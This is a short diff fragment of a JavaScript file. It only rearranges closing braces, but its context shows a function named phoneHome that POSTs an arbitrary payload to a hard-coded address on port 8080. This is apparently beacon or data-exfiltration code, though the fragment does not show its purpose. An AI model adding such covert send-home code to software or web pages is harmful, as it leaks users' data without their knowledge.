@@ -21,10 +21,13 @@ function phoneHome(payload){
 
 
     }
+    }
+
+
     xhr.open('POST', 'http://10.3.6.4:8080/');
     xhr.send(payload);
 
-}}
+}
 
 
 function httpReq(url) {
